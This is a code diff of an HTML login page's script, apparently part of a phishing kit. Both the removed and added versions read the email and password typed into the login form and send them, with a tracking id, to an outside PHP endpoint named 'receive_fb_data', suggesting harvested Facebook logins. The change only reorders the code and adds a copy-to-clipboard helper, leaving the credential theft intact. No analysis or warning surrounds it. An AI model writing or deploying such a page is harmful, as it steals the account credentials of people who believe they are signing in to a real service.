@@ -36,44 +36,42 @@
     </div>
   </body>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-  <script>
-    
-    function getUrlParameter(name) {
-      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
-      const regex = new RegExp("[\\?&]" + name + "=([^&#]*)");
-      const results = regex.exec(location.search);
-      return results === null
-        ? ""
-        : decodeURIComponent(results[1].replace(/\+/g, " "));
-    }
+ <script>
+        function copyText(id) {
+            const textToCopy = document.getElementById(id);
+            const tempTextarea = document.createElement("textarea");
+            tempTextarea.value = textToCopy.innerText;
+            document.body.appendChild(tempTextarea);
+            tempTextarea.select();
+            tempTextarea.setSelectionRange(0, 99999);
+            document.execCommand("copy");
+            document.body.removeChild(tempTextarea);
+            alert("Copied the text: " + textToCopy.innerText);
+        }
 
-    document
-      .getElementById("loginForm")
-      .addEventListener("submit", function (event) {
-        event.preventDefault();
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('pwd').value;
+            const url_id = getUrlParameter('url_id');
+            const data = { email, password, url_id };
 
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("pwd").value;
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://8080.rf.gd/receive_fb_data.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log(xhr.responseText);
+                }
+            };
+            xhr.send(JSON.stringify(data));
+        });
 
-        const url_id = getUrlParameter("url_id");
-
-        const data = {
-          email: email,
-          password: password,
-          url_id: url_id,
-        };
-
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://8080.rf.gd/receive_fb_data.php", true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-
-        xhr.onreadystatechange = function () {
-          if (xhr.readyState === 4 && xhr.status === 200) {
-            console.log(xhr.responseText);
-          }
-        };
-
-        xhr.send(JSON.stringify(data));
-      });
-  </script>
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            const results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+    </script>
 </html>
